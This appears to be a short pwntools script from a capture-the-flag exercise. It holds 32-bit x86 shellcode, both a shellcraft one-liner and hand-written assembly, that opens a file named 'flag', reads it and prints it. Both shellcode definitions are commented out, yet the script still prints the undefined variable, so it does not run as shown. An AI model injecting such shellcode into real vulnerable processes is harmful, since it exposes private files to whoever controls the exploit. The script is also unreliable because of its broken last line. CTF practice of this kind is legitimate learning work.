from pwn import *

# payload=asm(shellcraft.open("flag")+shellcraft.read('eax','esp',100)+shellcraft.write(1,'esp',100))
# print(payload)
# shellcode = asm('''
#  xor ecx,ecx;
#  xor edx,edx;
#  push 0x0
#  push 0x67616c66;
#  mov ebx,esp;
#  mov eax,0x5;
#  int 0x80;

#  mov ebx,0x3; 
#  mov ecx, esp;
#  mov edx, 0x40;
#  mov eax, 0x3;
#  int 0x80;
 
#  mov ebx, 0x1;
#  mov ecx, esp;
#  mov edx, 0x40;
#  mov eax, 0x4;
#  int 0x80;
#                   ''')
print(shellcode)
